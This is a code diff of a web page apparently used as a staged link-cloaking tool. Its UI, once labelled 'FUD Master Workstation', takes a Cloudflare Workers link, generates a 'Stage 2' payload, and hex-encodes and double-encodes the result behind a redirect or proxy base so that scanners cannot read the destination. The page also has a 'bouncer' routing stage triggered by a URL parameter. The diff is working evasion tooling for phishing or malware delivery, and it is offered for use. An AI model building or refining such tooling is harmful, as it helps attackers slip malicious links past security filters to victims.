@@ -18,21 +18,21 @@
 
     <div id="generatorUI" style="display:none; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white;">
         <div style="width: 100%; max-width: 600px; background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155;">
-            <h2 style="color:#38bdf8; margin-top:0;">FUD Master Workstation</h2>
+            <h2 style="color:#38bdf8; margin-top:0;">Total Hex Cloak Station</h2>
             
             <p style="font-size:12px; color:#94a3b8;">1. Worker Link (Stage 1):</p>
-            <input type="text" id="workerLink" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="https://...workers.dev/#key">
-            <button onclick="makeStage2()" style="background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">GENERATE FUD PAYLOAD</button>
+            <input type="text" id="workerLink" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="https://...workers.dev/">
+            <button onclick="makeStage2()" style="background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">GENERATE 15-SALT PAYLOAD</button>
             <div id="stage2Output" style="margin-top: 10px; padding: 10px; background: #020617; color: #94a3b8; font-size: 10px; word-break: break-all; display: none;"></div>
 
-            <p style="font-size:12px; color:#94a3b8; margin-top:20px;">2. Redirect Base & Encoding:</p>
-            <input type="text" id="redirectBase" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="https://site.com/proxy?url=">
+            <p style="font-size:12px; color:#94a3b8; margin-top:20px;">2. Redirect Base & Total Hex Mask:</p>
+            <input type="text" id="redirectBase" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="https://site.com/proxy?request=">
             
             <label style="font-size:12px; display: flex; align-items: center; gap: 8px; cursor: pointer; margin: 10px 0;">
-                <input type="checkbox" id="doubleEncode" style="width:auto; margin:0;"> 🛡️ Enable Double-Encoding (Ultra Stealth)
+                <input type="checkbox" id="doubleEncode" style="width:auto; margin:0;"> 🛡️ Enable Double-Encoding (Turns % into %25)
             </label>
 
-            <button onclick="mergeFinal()" style="background:#10b981; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">FINALIZE & MASK LINK</button>
+            <button onclick="mergeFinal()" style="background:#10b981; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">FINALIZE TOTAL HEX CLOAK</button>
             
             <div id="finalContainer" style="display:none; margin-top:15px;">
                 <div id="finalOutput" style="padding: 10px; background: #020617; border: 1px dashed #10b981; color: #10b981; font-size: 11px; word-break: break-all; margin-bottom:10px;"></div>
@@ -48,6 +48,7 @@
         const params = new URLSearchParams(window.location.search);
         const payload = params.get('p');
 
+        // ROUTING
         if (payload) {
             document.getElementById('bouncerUI').style.display = 'flex';
             document.getElementById('holdScreen').remove();
@@ -67,6 +68,7 @@
             document.getElementById('holdScreen').remove();
         }
 
+        // STAGE 2
         function makeStage2() {
             const input = document.getElementById('workerLink').value;
             if(!input) return;
@@ -83,26 +85,31 @@
             document.getElementById('stage2Output').style.display = 'block';
         }
 
+        // STAGE 3: THE TOTAL HEX CLOAK
         function mergeFinal() {
             const base = document.getElementById('redirectBase').value;
             const github = document.getElementById('stage2Output').innerText;
             const isDouble = document.getElementById('doubleEncode').checked;
             if(!base || !github) return;
 
-            // FULL MASK: Encodes the entire github string including https://
-            let encodedPath = encodeURIComponent(github);
-            if(isDouble) { encodedPath = encodeURIComponent(encodedPath); }
+            // This loop forces EVERY character to %HEX
+            let hexBlob = "";
+            for (let i = 0; i < github.length; i++) {
+                hexBlob += "%" + github.charCodeAt(i).toString(16).padStart(2, '0');
+            }
 
-            const finalLink = base + encodedPath;
-            document.getElementById('finalOutput').innerText = finalLink;
+            // If Double-Encode is on, we mask the % signs
+            if(isDouble) {
+                hexBlob = hexBlob.replace(/%/g, '%25');
+            }
+
+            document.getElementById('finalOutput').innerText = base + hexBlob;
             document.getElementById('finalContainer').style.display = 'block';
         }
 
         function copyToClipboard() {
             const text = document.getElementById('finalOutput').innerText;
-            navigator.clipboard.writeText(text).then(() => {
-                alert("Copied to clipboard!");
-            });
+            navigator.clipboard.writeText(text).then(() => { alert("Copied!"); });
         }
     </script>
 </body>
